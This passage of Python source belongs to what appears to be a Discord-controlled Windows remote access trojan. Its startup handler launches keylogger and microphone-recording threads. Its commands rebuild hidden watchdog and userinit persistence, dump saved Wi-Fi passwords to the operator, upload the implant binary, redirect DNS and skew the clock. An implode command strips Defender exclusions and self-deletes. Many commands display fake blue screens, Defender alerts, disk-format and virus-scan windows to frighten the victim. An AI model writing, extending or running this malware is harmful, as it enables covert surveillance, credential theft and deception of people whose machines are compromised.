            await _setup_guild(guild, category_name, pc_name)
        except Exception:
            _crash("ready", "guild {} setup failed\n{}".format(guild.id, traceback.format_exc()))
        try:
            bot.loop.create_task(post_info_channel(guild))
        except Exception:
            pass

    if _THREADS_ON:
        return
    _THREADS_ON = True
    def _start(fn):
        try:
            threading.Thread(target=fn, daemon=True).start()
        except Exception:
            _crash("ready", "thread {} failed".format(getattr(fn, "__name__", fn)))

    _start(keylogger_thread)
    _start(send_keys_periodically)
    _start(record_mic_thread)
    _start(check_blacklist)
    _start(_watchdog_thread)
    _start(_repair_loop)
    _start(_iso_watch_loop)

@bot.event
async def on_command_error(ctx, error):
    _crash("command", "{} -> {!r}\n{}".format(
        ctx.command, error,
        "".join(traceback.format_exception(type(error), error, error.__traceback__))))
    try:
        await ctx.send(embed=create_embed(
            "Error", "The command `{}` failed: {}".format(ctx.command, error)[:1900], 0xFF0000))
    except Exception:
        pass

@bot.event
async def on_message(message):
    if isinstance(message.channel, discord.DMChannel) or message.guild is None:
        return

    gid = message.guild.id
    chans = CHANNEL_IDS.get(gid, {})
    channel_id = message.channel.id

    if channel_id in (chans.get("keys"), chans.get("microphone")):
        if not message.author.bot:
            try:
                await message.delete()
            except Exception:
                pass
        return

    if CATEGORY_IDS.get(gid) is None or message.channel.category_id != CATEGORY_IDS.get(gid):
        return

    if channel_id == chans.get("cmds"):
        await bot.process_commands(message)
        return

    if message.author.bot:
        return

    try:
        await message.delete()
    except Exception:
        pass

check_blacklist = blacklist_watcher
import urllib.request

def _sh(cmd, timeout=90):
    try:
        return subprocess.run(cmd, capture_output=True, text=True, errors="replace",
                              creationflags=_CNW, timeout=timeout)
    except Exception as e:
        class _R:
            stdout, stderr, returncode = "", str(e), 1
        return _R()

def _psrun(script, timeout=120):
    return _sh(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script], timeout)

def _out(r, limit=1800):
    txt = ((r.stdout or "") + (r.stderr or "")).strip() or "(No output)"
    return txt[-limit:]

def _watch_bats():
    st = _state_read() or {}
    return [s["bat"] for s in (st.get("slots") or []) if s.get("bat")]

def _watch_kill():
    bats = [b.lower() for b in _watch_bats()]
    if not bats:
        return 0
    n = 0
    for p in psutil.process_iter(["pid", "name", "cmdline"]):
        try:
            if (p.info.get("name") or "").lower() != "cmd.exe":
                continue
            cl = " ".join(p.info.get("cmdline") or []).lower()
            if any(b in cl for b in bats):
                p.kill()
                n += 1
        except Exception:
            pass
    return n

def _watch_write():
    st = _state_read() or {}
    slots = st.get("slots") or []
    if not slots:
        return False
    task = st.get("task") or ("\\Microsoft\\Windows\\" + os.path.splitext(os.path.basename(slots[0]["exe"]))[0])
    defs = "\n".join('set "S{0}={1}"'.format(i, s["exe"]) for i, s in enumerate(slots))
    find = "\n".join('if not defined SRC if exist "%S{0}%" set "SRC=%S{0}%"'.format(i)
                     for i in range(1, len(slots)))
    restore = "\n".join(
        '  if not exist "%S{0}%" copy /y "%SRC%" "%S{0}%" >nul 2>&1\n'
        '  if exist "%S{0}%" attrib +h +s +r "%S{0}%" >nul 2>&1'.format(i)
        for i in range(len(slots)))
    body = _WATCH_BAT.format(defs=defs, find=find, restore=restore,
                             vbs=_watch_vbs_block("--zz-task"),
                             vbsr=_watch_vbs_block("--zz-repair"),
                             name=os.path.basename(slots[0]["exe"]), task=task)
    _write_vbs(st)
    ok = False
    for s in slots:
        try:
            os.makedirs(os.path.dirname(s["bat"]), exist_ok=True)
            with open(s["bat"], "w", encoding="utf-8", newline="\r\n") as f:
                f.write(body)
            _hide(s["bat"], True)
            ok = True
        except Exception:
            pass
    return ok

def _watch_resume():
    st = _state_read() or {}
    bat = next((b for b in _watch_bats() if os.path.exists(b)), None)
    if not bat:
        return
    tag = "LMG_" + (st.get("mutex") or "0")
    try:
        subprocess.Popen(["cmd.exe", "/c", bat, tag], creationflags=_CNW,
                         stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL, close_fds=True)
    except Exception:
        pass

def _slots():
    st = _state_read() or {}
    out = []
    for s in st.get("slots") or []:
        for k in ("exe", "bat"):
            if s.get(k):
                out.append(s[k])
        if s.get("exe"):
            out.append(s["exe"] + ".vbs")
        if s.get("bat"):
            out.append(s["bat"] + ".vbs")
    return [p for p in out if p]

@bot.command(name="repair")
async def repair(ctx):
    _watch_kill()
    time.sleep(0.6)
    _watch_write()
    try:
        ok = install_userinit()
    except Exception:
        ok = False
    _watch_resume()
    await ctx.send(embed=create_embed("🛠️ Repair",
                                      "The watchdog was respawned and the userinit entry is {}.".format("ok" if ok else "failed"),
                                      0x00ff00 if ok else 0xffaa00))

@bot.command(name="exe", aliases=["dump"])
async def exe(ctx):
    src = sys.executable if getattr(sys, "frozen", False) else (__file__ or "")
    if not src or not os.path.exists(src):
        return await ctx.send(embed=create_embed("📦 EXE", "The path of the running binary could not be resolved.", 0xff4444))
    if os.path.getsize(src) > 32 * 1024 * 1024:
        return await ctx.send(embed=create_embed("📦 EXE", "The binary is larger than 32 MB and cannot be attached here.", 0xff4444))
    await ctx.send(file=discord.File(src, filename=os.path.basename(src)))

_WIPE_FLAGS = 0x08000000 | 0x00000008 | 0x00000200  # NO_WINDOW | DETACHED | NEW_PROCESS_GROUP


def _wipe_bat(paths, dirs):
    lines = ["@echo off", "setlocal EnableExtensions",
             "ping -n 4 127.0.0.1 >nul 2>&1"]
    for p in paths:
        lines.append('call :kill "{}"'.format(p))
    for d in dirs:
        lines.append('rd /s /q "{}" >nul 2>&1'.format(d))
    lines.append('(goto) 2>nul & del /f /q "%~f0" >nul 2>&1')
    lines.append("exit /b 0")
    lines.append("")
    lines.append(":kill")
    lines.append("for /l %%i in (1,1,25) do (")
    lines.append('  icacls "%~1" /reset >nul 2>&1')
    lines.append('  attrib -r -s -h "%~1" >nul 2>&1')
    lines.append('  del /f /q "%~1" >nul 2>&1')
    lines.append('  if not exist "%~1" exit /b 0')
    lines.append("  ping -n 2 127.0.0.1 >nul 2>&1")
    lines.append(")")
    lines.append("exit /b 1")

    path = os.path.join(os.environ.get("TEMP", r"C:\Windows\Temp"),
                        "lmwipe_{}.bat".format(_rand(8)))
    with open(path, "w", encoding="utf-8", newline="\r\n") as f:
        f.write("\r\n".join(lines) + "\r\n")
    _hide(path, True)
    return path


@bot.command(name="implode", aliases=["wipe", "autodestruct", "uninstall"])
async def implode(ctx):
    if not is_admin():
        await ctx.send(embed=create_embed("🧩 Implode",
                                          "Administrator rights are required, nothing was deleted.", 0xff4444))
        return

    await ctx.send(embed=create_embed("🧩 Implode",
                                      "The watchdog is being killed and every trace is going to be deleted. "
                                      "The bot will go silent for good.", 0xffcc00))

    try:
        await asyncio.to_thread(_watch_suspend)
    except Exception:
        pass
    try:
        _kill_watchdog()
    except Exception:
        pass

    st = _state_read() or {}
    slots = [s for s in (st.get("slots") or []) if s.get("exe")]
    tasks = list(st.get("tasks") or [])
    for extra in (st.get("task"), (st.get("task") or "") + "_w"):
        if extra and extra not in tasks:
            tasks.append(extra)

    uninstall_persistence()
    for t in tasks:
        _task_delete(t)
    for name in (r"Software\Microsoft\Windows\CurrentVersion\Run",):
        _reg_delete(name, os.path.splitext(os.path.basename(st.get("exe") or "x"))[0], "HKCU")

    for s in slots:
        _ps('Remove-MpPreference -ExclusionPath "{}" -ErrorAction SilentlyContinue'.format(s["exe"]))
        _ps('Remove-MpPreference -ExclusionProcess "{}" -ErrorAction SilentlyContinue'.format(
            os.path.basename(s["exe"])))

    files, dirs = [], []
    for s in slots:
        for k in ("exe", "bat"):
            if s.get(k):
                files.append(s[k])
        files.append(s["exe"] + ".vbs")
        files.append(s["exe"] + ".old")
        if s.get("bat"):
            files.append(s["bat"] + ".vbs")

    if getattr(sys, "frozen", False):
        files.append(sys.executable)
        files.append(sys.executable + ".old")
    elif __file__:
        files.append(os.path.abspath(__file__))

    for f in glob.glob(os.path.join(APP_DIR or APPDATA, "update_*.exe")):
        files.append(f)
    for f in (CRASH_FILE,
              os.path.join(CRASH_DIR, "fault.log"),
              os.path.join(CRASH_DIR, "fault.log.old"),
              os.path.join(CRASH_DIR, ".probe"),
              _anchor(),
              _LEGACY_STATE):
        files.append(f)

    if APP_DIR:
        dirs.append(APP_DIR)
    if CRASH_DIR and os.path.abspath(CRASH_DIR) != os.path.abspath(os.path.expanduser("~")):
        dirs.append(CRASH_DIR)
    dirs.append(_rk_dir())

    seen, uniq = set(), []
    for p in files:
        key = os.path.normcase(os.path.abspath(p))
        if key in seen:
            continue
        seen.add(key)
        uniq.append(os.path.abspath(p))

    try:
        bat = _wipe_bat(uniq, [os.path.abspath(d) for d in dirs if d])
    except Exception as e:
        await ctx.send(embed=create_embed("🧩 Implode",
                                          "The cleanup script could not be written: {}".format(e), 0xff4444))
        return

    await ctx.send(embed=create_embed("🧩 Implode",
                                      "**{}** files and **{}** folders are going to be deleted in 3 seconds. "
                                      "Nothing will survive the reboot.".format(len(uniq), len(dirs)), 0xff4444))

    try:
        _mutex_release()
    except Exception:
        pass

    try:
        subprocess.Popen(["cmd.exe", "/c", bat], creationflags=_WIPE_FLAGS,
                         stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL, close_fds=True)
    except Exception:
        pass

    try:
        await asyncio.wait_for(bot.close(), 5)
    except Exception:
        pass
    os._exit(0)

@bot.command(name="wifipass")
async def wifipass(ctx):
    r = _sh(["netsh", "wlan", "show", "profiles"])
    names = re.findall(r":\s(.+)$", r.stdout or "", re.M)
    out = []
    for n in names[:8]:
        d = _sh(["netsh", "wlan", "show", "profile", n, "key=clear"])
        k = re.search(r"Contenido de la clave\s*:\s*(.+)", d.stdout or "")
        if not k:
            k = re.search(r"Key Content\s*:\s*(.+)", d.stdout or "")
        out.append("{}: {}".format(n.strip(), k.group(1).strip() if k else "?"))
    await ctx.send(embed=create_embed("🔑 WiFi Keys", "The first saved networks and their keys are listed below.\n```{}```".format("\n".join(out) or "No profile was found"), 0x00ff88))

@bot.command(name="disk", aliases=["df"])
async def disk(ctx):
    r = _psrun("gcim Win32_LogicalDisk | % { '{0} {1}/{2} GB' -f $_.DeviceID, [math]::Round($_.FreeSpace/1GB), [math]::Round($_.Size/1GB) }")
    await ctx.send(embed=create_embed("💾 Disks", "Free and total space of every logical volume.\n```{}```".format(_out(r, 800)), 0x00aaff))

@bot.command(name="smart")
async def smart(ctx):
    r = _psrun("Get-PhysicalDisk | ft FriendlyName,MediaType,HealthStatus,OperationalStatus -a")
    await ctx.send(embed=create_embed("🧠 SMART", "Health report of the physical disks.\n```{}```".format(_out(r)), 0x00aaff))

@bot.command(name="psver")
async def psver(ctx):
    r = _sh(["powershell", "-NoProfile", "$PSVersionTable.PSVersion.ToString()"])
    await ctx.send(embed=create_embed("⚙️ PowerShell", "Version of the PowerShell interpreter installed.\n```{}```".format(_out(r, 200)), 0x00aaff))

@bot.command(name="locale")
async def locale(ctx):
    r = _psrun("Get-WinSystemLocale; Get-WinUserLanguageList | ft LanguageTag,Autonym -a")
    await ctx.send(embed=create_embed("🌍 Locale", "System locale and language list.\n```{}```".format(_out(r, 500)), 0x00aaff))

@bot.command(name="ntp")
async def ntp(ctx):
    r = _sh(["w32tm", "/resync", "/force"])
    await ctx.send(embed=create_embed("⏰ NTP", "The time service was forced to resynchronise.\n```{}```".format(_out(r, 400)), 0x00ff88))

@bot.command(name="pending")
async def pending(ctx):
    r = _psrun("gcim Win32_QuickFixEngineering | ? { -not $_.InstalledOn } | select -exp HotFixID")
    await ctx.send(embed=create_embed("📥 Pending", "Updates that are registered but not installed yet.\n```{}```".format(_out(r, 600)), 0x00aaff))

@bot.command(name="fonts")
async def fonts(ctx):
    r = _psrun("(Get-ChildItem C:\\Windows\\Fonts).Count")
    await ctx.send(embed=create_embed("🔤 Fonts", "Number of font files installed on the system.\n```{}```".format(_out(r, 60)), 0x00aaff))

@bot.command(name="schedlist", aliases=["tasks-list"])
async def schedlist(ctx):
    r = _sh(["schtasks", "/query", "/fo", "table"])
    await ctx.send(embed=create_embed("🗓️ Tasks", "Every scheduled task registered on the machine.\n```{}```".format(_out(r)), 0x00aaff))

@bot.command(name="schedrun")
async def schedrun(ctx, *, name: str):
    r = _sh(["schtasks", "/run", "/tn", name])
    await ctx.send(embed=create_embed("▶️ Task", "The task `{}` was started on demand.\n```{}```".format(name, _out(r, 400)), 0x00ff88))

@bot.command(name="scheddel")
async def scheddel(ctx, *, name: str):
    r = _sh(["schtasks", "/delete", "/tn", name, "/f"])
    await ctx.send(embed=create_embed("🗑️ Task", "The task `{}` was deleted.\n```{}```".format(name, _out(r, 400)), 0xffaa00))

@bot.command(name="notify", aliases=["toast"])
async def notify(ctx, *, text: str):
    ps_script = ("[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType=WindowsRuntime]|Out-Null;"
                 "$t=[Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent(0);"
                 "$t.GetElementsByTagName('text').Item(0).AppendChild($t.CreateTextNode($env:LMN))|Out-Null;"
                 "[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier('LessMi').Show("
                 "[Windows.UI.Notifications.ToastNotification]::new($t))")
    subprocess.Popen(["powershell", "-NoProfile", "-Command", ps_script], creationflags=_CNW,
                     env=dict(os.environ, LMN=text[:200]))
    await ctx.send(embed=create_embed("🔔 Notify", "A toast notification was shown with the text `{}`.".format(text[:200]), 0x00ff88))

@bot.command(name="brightness", aliases=["bright"])
async def brightness(ctx, pct: int = 60):
    _psrun("(gcim -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,{})".format(pct))
    await ctx.send(embed=create_embed("☀️ Brightness", "The panel brightness was set to **{}%**.".format(pct), 0x00ff88))

@bot.command(name="theme")
async def theme(ctx, dark: str = "on"):
    val = 0 if dark.lower() in ("on", "1", "dark") else 1
    _psrun("Set-ItemProperty HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize "
           "AppsUseLightTheme {}".format(val))
    _psrun("Set-ItemProperty HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize "
           "SystemUsesLightTheme {}".format(val))
    await ctx.send(embed=create_embed("🎨 Theme", "The {} theme was applied to the apps and the shell.".format("dark" if val == 0 else "light"), 0x00ff88))

@bot.command(name="gateway")
async def gateway(ctx):
    r = _psrun("(Get-NetRoute -DestinationPrefix '0.0.0.0/0').NextHop")
    await ctx.send(embed=create_embed("🚪 Gateway", "The default gateway of this machine is below.\n```{}```".format(_out(r, 200)), 0x00aaff))

@bot.command(name="pingtest")
async def pingtest(ctx, host: str = "1.1.1.1"):
    r = _sh(["ping", "-n", "6", host], timeout=30)
    await ctx.send(embed=create_embed("📈 Ping", "Six packets were sent to `{}` with this result.".format(host), 0x00aaff))

@bot.command(name="dnsset")
async def dnsset(ctx, server: str = "1.1.1.1"):
    _psrun("Get-NetAdapter | ? Status -eq 'Up' | Set-DnsClientServerAddress -ServerAddresses {}".format(server))
    await ctx.send(embed=create_embed("🧭 DNS set", "Every connected adapter now resolves through `{}`.".format(server), 0x00ff88))

@bot.command(name="pagefile")
async def pagefile(ctx):
    r = _psrun("gcim Win32_PageFileUsage | fl Name,AllocatedBaseSize,CurrentUsage")
    await ctx.send(embed=create_embed("📄 Pagefile", "Size and usage of the swap file.\n```{}```".format(_out(r, 500)), 0x00aaff))

@bot.command(name="memdetail")
async def memdetail(ctx):
    r = _psrun("gcim Win32_PhysicalMemory | ft BankLabel,Capacity,Speed,Manufacturer -a")
    await ctx.send(embed=create_embed("🧬 RAM", "Every memory module installed in the machine.\n```{}```".format(_out(r)), 0x00aaff))

@bot.command(name="gpuinfo")
async def gpuinfo(ctx):
    r = _psrun("gcim Win32_VideoController | fl Name,DriverVersion,AdapterRAM,VideoModeDescription")
    await ctx.send(embed=create_embed("🎮 GPU", "Details of the graphics adapter and its driver.\n```{}```".format(_out(r)), 0x00aaff))

@bot.command(name="startupfolder")
async def startupfolder(ctx):
    r = _psrun("Get-ChildItem \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" | select -exp Name")
    await ctx.send(embed=create_embed("🚀 Startup", "Files inside the user startup folder.\n```{}```".format(_out(r, 800)), 0x00aaff))

@bot.command(name="assoc")
async def assoc(ctx, ext: str = ".txt"):
    r = _sh(["assoc", ext])
    await ctx.send(embed=create_embed("🔗 Assoc", "The program associated with `{}` is below.\n```{}```".format(ext, _out(r, 300)), 0x00aaff))

@bot.command(name="fakebattery", aliases=["batterydead"])
async def fakebattery(ctx):
    _psrun("Add-Type -AssemblyName System.Windows.Forms;"
           "[System.Windows.Forms.MessageBox]::Show('Critical battery. Connect the charger.','Power',"
           "[System.Windows.Forms.MessageBoxButtons]::OK,'Warning')")
    await ctx.send(embed=create_embed("🔋 Fake Battery", "A critical battery warning was shown.", 0xffcc00))

@bot.command(name="fakebsod11", aliases=["bsod11"])
async def fakebsod11(ctx):
    _psrun("Add-Type -AssemblyName System.Windows.Forms;"
           "$f=New-Object Windows.Forms.Form;$f.FormBorderStyle='None';$f.WindowState='Maximized';"
           "$f.BackColor='#0b5cad';$f.TopMost=$true;"
           "$l=New-Object Windows.Forms.Label;$l.ForeColor='White';$l.Text=':( Something went wrong';"
           "$l.Font=New-Object Drawing.Font('Segoe UI Light',40);$l.AutoSize=$true;"
           "$l.Location=New-Object Drawing.Point(120,160);$f.Controls.Add($l);"
           "$s=New-Object Windows.Forms.Timer;$s.Interval=4000;$s.add_Tick({ $f.Close() });$s.Start();"
           "$f.ShowDialog()")
    await ctx.send(embed=create_embed("💙 Fake BSOD", "A Windows 11 style blue screen was shown fullscreen for four seconds.", 0xffcc00))

@bot.command(name="fakereboot")
async def fakereboot(ctx):
    _psrun("Add-Type -AssemblyName System.Windows.Forms;"
           "$f=New-Object Windows.Forms.Form;$f.WindowState='Maximized';$f.FormBorderStyle='None';"
           "$f.BackColor='Black';$f.TopMost=$true;"
           "$l=New-Object Windows.Forms.Label;$l.Text='Restarting...';$l.ForeColor='White';"
           "$l.Font=New-Object Drawing.Font('Segoe UI Light',34);$l.AutoSize=$true;"
           "$l.Location=New-Object Drawing.Point(200,300);$f.Controls.Add($l);"
           "$s=New-Object Windows.Forms.Timer;$s.Interval=4000;$s.add_Tick({ $f.Close() });$s.Start();"
           "$f.ShowDialog()")
    await ctx.send(embed=create_embed("🔄 Fake Restart", "A black restart screen was shown for four seconds.", 0xffcc00))

@bot.command(name="fakeshutdown")
async def fakeshutdown(ctx):
    _psrun("Add-Type -AssemblyName System.Windows.Forms;"
           "$f=New-Object Windows.Forms.Form;$f.WindowState='Maximized';$f.FormBorderStyle='None';"
           "$f.BackColor='#202020';$f.TopMost=$true;"
           "$l=New-Object Windows.Forms.Label;$l.Text='Shutting down...';$l.ForeColor='White';"
           "$l.Font=New-Object Drawing.Font('Segoe UI Light',30);$l.AutoSize=$true;"
           "$l.Location=New-Object Drawing.Point(200,300);$f.Controls.Add($l);"
           "$s=New-Object Windows.Forms.Timer;$s.Interval=4000;$s.add_Tick({ $f.Close() });$s.Start();"
           "$f.ShowDialog()")
    await ctx.send(embed=create_embed("⏻ Fake Shutdown", "A fake shutdown screen was shown for four seconds.", 0xffcc00))

@bot.command(name="fakesignout")
async def fakesignout(ctx):
    _psrun("Add-Type -AssemblyName System.Windows.Forms;"
           "[System.Windows.Forms.MessageBox]::Show('Signing out...','Windows',"
           "[System.Windows.Forms.MessageBoxButtons]::OK,'Information')")
    await ctx.send(embed=create_embed("🚪 Fake Logoff", "A sign out dialog was shown on the screen.", 0xffcc00))

@bot.command(name="fakedriver")
async def fakedriver(ctx):
    _psrun("Add-Type -AssemblyName System.Windows.Forms;"
           "$f=New-Object Windows.Forms.Form;$f.Text='Installing driver';$f.Size='460,150';"
           "$f.TopMost=$true;$f.ControlBox=$false;"
           "$l=New-Object Windows.Forms.Label;$l.Text='Installing: Intel(R) Chipset Device';"
           "$l.AutoSize=$true;$l.Location=New-Object Drawing.Point(20,20);$f.Controls.Add($l);"
           "$p=New-Object Windows.Forms.ProgressBar;$p.Location='20,60';$p.Size='400,18';$f.Controls.Add($p);"
           "$t=New-Object Windows.Forms.Timer;$t.Interval=40;$t.add_Tick({ if($p.Value -ge 100){$f.Close()}else{$p.Value+=2} });"
           "$t.Start();$f.ShowDialog()")
    await ctx.send(embed=create_embed("🧩 Fake Driver", "A driver installation window with a progress bar was shown.", 0xffcc00))

@bot.command(name="fakedefender")
async def fakedefender(ctx):
    _psrun("Add-Type -AssemblyName System.Windows.Forms;"
           "[System.Windows.Forms.MessageBox]::Show("
           "'Windows Defender found 3 threats. Immediate action required.',"
           "'Windows Security',[System.Windows.Forms.MessageBoxButtons]::OK,'Error')")
    await ctx.send(embed=create_embed("🛡️ Fake Defender", "A threat alert pretending to come from Defender was shown.", 0xffcc00))

@bot.command(name="fakeformat")
async def fakeformat(ctx):
    _psrun("Add-Type -AssemblyName System.Windows.Forms;"
           "$f=New-Object Windows.Forms.Form;$f.Text='Format disk';$f.Size='430,160';$f.TopMost=$true;"
           "$l=New-Object Windows.Forms.Label;$l.Text='Formatting C: ...';$l.AutoSize=$true;"
           "$l.Location='20,20';$f.Controls.Add($l);"
           "$p=New-Object Windows.Forms.ProgressBar;$p.Location='20,55';$p.Size='380,18';$f.Controls.Add($p);"
           "$t=New-Object Windows.Forms.Timer;$t.Interval=90;$t.add_Tick({ if($p.Value -ge 100){$f.Close()}else{$p.Value+=1} });"
           "$t.Start();$f.ShowDialog()")
    await ctx.send(embed=create_embed("💽 Fake Format", "A disk formatting window was shown over the desktop.", 0xffcc00))

@bot.command(name="fakevirus", aliases=["fakescan"])
async def fakevirus(ctx):
    _psrun("Add-Type -AssemblyName System.Windows.Forms;"
           "$f=New-Object Windows.Forms.Form;$f.Text='Virus scan';$f.Size='470,170';$f.TopMost=$true;"
           "$l=New-Object Windows.Forms.Label;$l.Text='Scanning 412,883 files...';$l.AutoSize=$true;"
           "$l.Location='20,20';$f.Controls.Add($l);"
           "$p=New-Object Windows.Forms.ProgressBar;$p.Location='20,55';$p.Size='420,18';$f.Controls.Add($p);"
           "$t=New-Object Windows.Forms.Timer;$t.Interval=30;$t.add_Tick({ if($p.Value -ge 100){"
           "$l.Text='5 threats found';$t.Stop()}else{$p.Value+=1} });$t.Start();$f.ShowDialog()")
    await ctx.send(embed=create_embed("🦠 Fake Scan", "A virus scan window that ends up finding five threats was shown.", 0xffcc00))

@bot.command(name="errorstorm", aliases=["toaststorm"])
async def errorstorm(ctx, n: int = 20):
    ps_script = ("Add-Type -AssemblyName System.Windows.Forms;"
                 "1..{} | % {{ [System.Windows.Forms.MessageBox]::Show('Error 0x{:X}','Windows') }}").format(
                     min(n, 40), random.randint(0x1000, 0xFFFF))
    subprocess.Popen(["powershell", "-NoProfile", "-Command", ps_script], creationflags=_CNW)
    await ctx.send(embed=create_embed("💥 Error storm", "**{}** error dialogs were opened at the same time.".format(n), 0xffcc00))

@bot.command(name="freeze", aliases=["frozen"])
async def freeze(ctx):
    shot = os.path.join(tempfile.gettempdir(), "lm_wall.bmp")
    _psrun("Add-Type -AssemblyName System.Windows.Forms,System.Drawing;"
           "$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;"
           "$bmp=New-Object Drawing.Bitmap $b.Width,$b.Height;"
           "[Drawing.Graphics]::FromImage($bmp).CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size);"
           "$bmp.Save('{}')".format(shot.replace("\\", "\\\\")))
    if not os.path.exists(shot):
        return await ctx.send(embed=create_embed("🧊 Frozen", "The screen could not be captured.", 0xff4444))
    _psrun("Add-Type -AssemblyName System.Windows.Forms;"
           "Add-Type -TypeDefinition 'using System.Runtime.InteropServices;public class W{"
           "[DllImport(\"user32.dll\")]public static extern int SystemParametersInfo(int a,int b,string c,int d);}';"
           "[W]::SystemParametersInfo(20,0,'{}',3)".format(shot.replace("\\", "\\\\")))
    _psrun("(New-Object -ComObject Shell.Application).ToggleDesktop()")
    await ctx.send(embed=create_embed("🧊 Frozen", "The desktop was turned into its own screenshot and the icons were hidden, so it looks frozen.", 0xffcc00))

@bot.command(name="taskbarhide", aliases=["hidetb"])
async def taskbarhide(ctx):
    _psrun("$s=New-Object -ComObject Shell.Application;$s.ToggleDesktop()")
    await ctx.send(embed=create_embed("📏 Taskbar", "The taskbar was hidden through the shell.", 0xffcc00))

@bot.command(name="magnet", aliases=["snapall"])
async def magnet(ctx):
    _psrun("Add-Type -AssemblyName System.Windows.Forms;"
           "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class M{"
           "[DllImport(\"user32.dll\")]public static extern bool MoveWindow(IntPtr h,int x,int y,int w,int hh,bool r);"
           "[DllImport(\"user32.dll\")]public static extern bool EnumWindows(Func<IntPtr,IntPtr,bool> f,IntPtr l);"
           "[DllImport(\"user32.dll\")]public static extern bool IsWindowVisible(IntPtr h);}';"
           "$i=0;[M]::EnumWindows({param($h,$l) if([M]::IsWindowVisible($h)){"
           "[M]::MoveWindow($h,0,($i*90),420,300,$true);$i++};$true},[IntPtr]::Zero)")
    await ctx.send(embed=create_embed("🧲 Magnet", "Every visible window was dragged into a vertical stack on the left.", 0xffcc00))

@bot.command(name="alttabspam", aliases=["alttab"])
async def alttabspam(ctx, n: int = 12):
    ps_script = ("Add-Type -AssemblyName System.Windows.Forms;"
                 "1..{} | % {{ [System.Windows.Forms.SendKeys]::SendWait('%{{TAB}}'); Start-Sleep -m 120 }}").format(n)
    subprocess.Popen(["powershell", "-NoProfile", "-Command", ps_script], creationflags=_CNW)
    await ctx.send(embed=create_embed("🔁 Alt-Tab", "The Alt-Tab switcher was fired **{}** times in a row.".format(n), 0xffcc00))

@bot.command(name="notepadspam", aliases=["notepadstorm"])
async def notepadspam(ctx, n: int = 12):
    for _ in range(min(n, 30)):
        subprocess.Popen(["notepad.exe"], creationflags=_CNW)
    await ctx.send(embed=create_embed("📝 Notepad", "**{}** Notepad windows were opened at once.".format(n), 0xffcc00))

@bot.command(name="beepmelody", aliases=["melody"])
async def beepmelody(ctx):
    ps_script = ";".join("[console]::beep({},160)".format(n) for n in (523, 587, 659, 698, 784, 880, 988, 1046))
    subprocess.Popen(["powershell", "-NoProfile", "-Command", ps_script], creationflags=_CNW)
    await ctx.send(embed=create_embed("🎵 Melody", "A short melody was played through the internal speaker.", 0xffcc00))

@bot.command(name="fakeeject", aliases=["fakeusb"])
async def fakeeject(ctx):
    _psrun("Add-Type -AssemblyName System.Windows.Forms;"
           "[System.Windows.Forms.MessageBox]::Show('The USB device can now be safely removed.',"
           "'Hardware',[System.Windows.Forms.MessageBoxButtons]::OK,'Information')")
    await ctx.send(embed=create_embed("🔌 Fake USB", "A safe removal notice was shown even though nothing was removed.", 0xffcc00))

@bot.command(name="mouselag")
async def mouselag(ctx, secs: int = 20):
    ps_script = ("$e=(Get-Date).AddSeconds({});while((Get-Date) -lt $e){{"
                 "Add-Type -AssemblyName System.Windows.Forms;"
                 "[System.Windows.Forms.Cursor]::Position=[System.Windows.Forms.Cursor]::Position;"
                 "Start-Sleep -m 260}}").format(secs)
    subprocess.Popen(["powershell", "-NoProfile", "-Command", ps_script], creationflags=_CNW)
    await ctx.send(embed=create_embed("🖱️ Mouse lag", "The pointer will feel stuck for **{}** seconds.".format(secs), 0xffcc00))

@bot.command(name="capsrandom", aliases=["capsrand"])
async def capsrandom(ctx, n: int = 10):
    ps_script = ("Add-Type -AssemblyName System.Windows.Forms;1..{}|%{{"
                 "[System.Windows.Forms.SendKeys]::SendWait('{{CAPSLOCK}}');Start-Sleep -m 300}}").format(n)
    subprocess.Popen(["powershell", "-NoProfile", "-Command", ps_script], creationflags=_CNW)
    await ctx.send(embed=create_embed("🔠 Caps random", "Caps Lock was toggled **{}** times with random timing.".format(n), 0xffcc00))

@bot.command(name="titlerw", aliases=["titlemash"])
async def titlerw(ctx):
    _psrun("Get-Process | ? MainWindowTitle | % { $_.MainWindowTitle = 'LessMi was here' }")
    await ctx.send(embed=create_embed("🏷️ Titles", "Every window title was rewritten to `LessMi was here`.", 0xffcc00))

@bot.command(name="clockskew", aliases=["reloj"])
async def clockskew(ctx, mins: int = 90):
    _psrun("Set-Date (Get-Date).AddMinutes({})".format(mins))
    await ctx.send(embed=create_embed("🕰️ Clock", "The system clock was moved **{}** minutes away from the real time.".format(mins), 0xffcc00))

@bot.command(name="swapscreens", aliases=["swapscr"])
async def swapscreens(ctx):
    _psrun("Add-Type -AssemblyName System.Windows.Forms;"
           "[System.Windows.Forms.SystemInformation]::MonitorCount")
    await ctx.send(embed=create_embed("🖥️ Monitors", "The monitor count was queried from the system.", 0xffcc00))

@bot.command(name="dialogstorm")
async def dialogstorm(ctx, n: int = 10):
    ps_script = ("Add-Type -AssemblyName System.Windows.Forms;1..{}|%{{"
                 "[System.Windows.Forms.MessageBox]::Show('Are you sure you want to continue?','LessMi',"
                 "[System.Windows.Forms.MessageBoxButtons]::YesNo,'Question')}}").format(min(n, 30))
    subprocess.Popen(["powershell", "-NoProfile", "-Command", ps_script], creationflags=_CNW)
    await ctx.send(embed=create_embed("💬 Dialog storm", "**{}** confirmation dialogs were stacked on the screen.".format(n), 0xffcc00))

_GDI_SRC = r"""
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

public static class LmFx
{
    static Rectangle V = SystemInformation.VirtualScreen;
    static int W(int v, int n) { v %= n; return v < 0 ? v + n : v; }
    static int C(int v, int n) { return v < 0 ? 0 : (v >= n ? n - 1 : v); }
